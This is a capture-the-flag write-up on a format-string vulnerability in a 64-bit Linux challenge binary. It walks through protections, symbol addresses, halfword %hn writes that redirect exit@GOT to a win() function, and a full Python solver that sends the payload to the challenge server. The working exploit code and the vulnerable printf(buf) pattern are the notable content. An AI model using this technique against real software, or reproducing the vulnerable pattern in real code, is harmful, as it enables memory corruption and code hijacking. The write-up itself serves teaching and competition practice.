---
title: "Format String GOT Hijack"
description: "Binary exploitation writeup for redirecting exit@GOT to win() with format-string halfword writes."
date: "2026-05-18"
author: "Carnage"
image: "/assets/images/writeups/ewurobofest-format-string-got-hijack/ewu.jpeg"
tags:
  - "EWU National ROBOFEST"
  - "Pwn"
  - "Format String"
  - "CTF"
draft: false
---

## Overview

The target binary reads one line of user input, performs a fake printing progress routine, and then calls `printf(user_input)`. Because user-controlled data is used as the format string, the program exposes a primitive that can both leak values and write to chosen addresses through the `%n` family of specifiers.

```text
Target: nc 160.187.130.156 23261
Platform: 64-bit Linux ELF
Primary bug: User-controlled format string passed to printf
Exploit goal: Redirect exit@GOT to win() and satisfy cheat_check
```

The exploit relies on two favorable binary properties: PIE is disabled, so code and data addresses are static, and RELRO is partial, so the GOT remains writable. Two `%hn` writes set `cheat_check` to `0x539` and change the low halfword of `exit@GOT` so it resolves to `win()`.

## Binary Triage

```bash
file challenge_1
readelf -h challenge_1
nm -n challenge_1
readelf -r challenge_1
objdump -d -M intel challenge_1 | less

python3 solve.py
```

## Protections

```text
Architecture: x86-64 ELF
PIE: Disabled / EXEC
RELRO: Partial
NX: Enabled
Canary: Not present
Stripped: No
```

These protections make GOT hijacking viable: code and data addresses are static, and `exit@GOT` remains writable.

## Important Symbols

```text
win(): 0x401328
cheat_check: 0x404070
exit@GOT: 0x404058
target halfword: 0x1328
format argument indexes: %10$hn / %11$hn
```

## Relevant Control Flow

```c
printf("This is a printer. What do you want to print?");
fgets(buf, 0x38, stdin);

/* fake printing progress loop omitted */

printf(buf);        // vulnerable: user input is the format string
exit(0);            // hijacked to win() through exit@GOT
```

The hidden function also contains a guard:

```c
if (cheat_check != 0x539)
    exit(1);

fp = fopen("./flag.txt", "r");
while (fgets(line, 0x32, fp))
    printf("%s", line);
```

## Vulnerability Analysis

The root cause is `printf(buf)`. Because `buf` is fully controlled by the user, format specifiers inside the input are interpreted by `printf`. Positional parameters allow the payload to reference addresses appended to the end of the input. The `%hn` conversion writes the current number of printed characters as a 16-bit value to the referenced address.

Local probing showed that, with the selected payload layout, the appended pointers were reachable as arguments `%10$...` and `%11$...`.

## Exploit Strategy

The exploit performs two halfword writes:

```text
1. Cumulative bytes printed: 0x0539 / 1337
   Destination: %10$hn -> cheat_check
   Effect: satisfies the win() guard

2. Cumulative bytes printed: 0x1328 / 4904
   Destination: %11$hn -> exit@GOT
   Effect: redirects exit() to win() by changing the low halfword
```

## Payload Construction

```python
payload = b"%1$1337c%10$hn"
payload += b"%1$3567c%11$hn"
payload += b"A" * ((-len(payload)) % 8)
payload += p64(0x404070) # cheat_check
payload += p64(0x404058) # exit@GOT
```

The second padding value is `3567` because `1337 + 3567 = 4904`, and `4904` is `0x1328`.

## Solver Script

```python
#!/usr/bin/env python3
import socket
import struct
import re

HOST = "160.187.130.156"
PORT = 23261

WIN = 0x401328
CHEAT_CHECK = 0x404070
EXIT_GOT = 0x404058

def p64(x: int) -> bytes:
    return struct.pack("<Q", x)

payload = b"%1$1337c%10$hn"
payload += b"%1$3567c%11$hn" # 1337 + 3567 = 4904 = 0x1328
payload += b"A" * ((-len(payload)) % 8)
payload += p64(CHEAT_CHECK)
payload += p64(EXIT_GOT)

def recv_all(sock: socket.socket) -> bytes:
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data

def main() -> None:
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.settimeout(30)

        try:
            print(s.recv(4096).decode(errors="ignore"), end="")
        except socket.timeout:
            pass

        s.sendall(payload + b"\n")
        text = recv_all(s).decode(errors="ignore")
        print(text)

        m = re.search(r"[A-Za-z0-9_]*\{[^}\r\n]+\}", text)
        if m:
            print("\nFLAG:", m.group(0))

if __name__ == "__main__":
    main()
```

Expected usage:

```text
$ python3 solve.py
This is a printer. What do you want to print?
printing 100% [||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||]
<flag output here>
FLAG: flag{...}
```

## Notes

- The remote service must run the same analyzed ELF because PIE is disabled and the exploit depends on static addresses.
- Partial RELRO leaves `exit@GOT` available for the halfword overwrite.
- If the binary is rebuilt, rerun `nm -n` and `readelf -r` to refresh symbol and GOT addresses.
